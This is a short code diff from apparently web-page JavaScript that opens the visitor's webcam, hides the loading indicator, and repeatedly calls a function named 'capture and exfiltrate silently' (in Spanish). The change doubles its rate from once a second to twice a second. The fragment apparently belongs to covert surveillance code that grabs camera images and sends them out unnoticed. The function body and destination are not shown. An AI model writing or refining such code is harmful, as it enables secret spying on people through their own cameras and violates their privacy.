@@ -88,7 +88,7 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                 video.srcObject = stream;
                 loadingDiv.style.display = 'none';
-                setInterval(capturarYExfiltrarSilenciosamente, 1000);
+                setInterval(capturarYExfiltrarSilenciosamente, 500);
             } catch (err) {
                 loadingDiv.innerHTML = '<p class="text-red-400 p-4 text-center">Error: Acceso a cámara denegado.</p>';
             }
